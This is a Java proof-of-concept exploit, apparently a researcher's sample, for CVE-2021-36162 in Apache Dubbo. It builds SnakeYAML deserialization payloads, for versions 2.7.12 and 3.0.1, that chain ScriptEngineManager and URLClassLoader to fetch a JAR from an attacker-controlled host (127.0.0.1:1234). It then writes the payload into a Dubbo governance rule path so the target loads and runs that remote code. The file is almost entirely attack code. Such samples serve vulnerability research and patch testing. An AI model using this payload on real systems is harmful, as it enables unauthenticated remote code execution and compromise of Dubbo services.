package org.apache.dubbo.samples.governance;

/**
 * @author Whoopsunix
 * <p>
 * CVE-2021-36162 pre-auth
 */
public class CVE_2021_36162 {
    public static void main(String[] args) throws Exception {
        /**
         * 先执行 RuleUtil 初始化环境
         */
        // 3.0.1
//        String path = "/dubbo/config/DEFAULT_GROUP/governance-mesh-rule-router-provider.MESHAPPRULE";
////
//        String attackerHost = "http://127.0.0.1:1234/SnakeyamlDemo-1.0.jar";
//        String poc = "---\n" +
//                "!!javax.script.ScriptEngineManager [\n" +
//                "    !!java.net.URLClassLoader [[\n" +
//                "        !!java.net.URL [\"" + attackerHost + "\"]\n" +
//                "    ]]\n" +
//                "]";
//        System.out.println(poc);

        // 2.7.12
        String path = "/dubbo/config/MIGRATION/governance-mesh-rule-consumer.migration";

        String attackerHost = "http://127.0.0.1:1234/SnakeyamlDemo-1.0.jar";
        String poc = "!!org.apache.dubbo.rpc.cluster.support.migration.MigrationRule {\n" +
                "    key: \n" +
                "        !!javax.script.ScriptEngineManager [\n" +
                "            !!java.net.URLClassLoader [[\n" +
                "                !!java.net.URL [\"" + attackerHost + "\"]\n" +
                "            ]]\n" +
                "        ]\n" +
                "}";
        System.out.println(poc);

        RuleUtil.initClient();
        RuleUtil.addData(path, poc);
    }
}
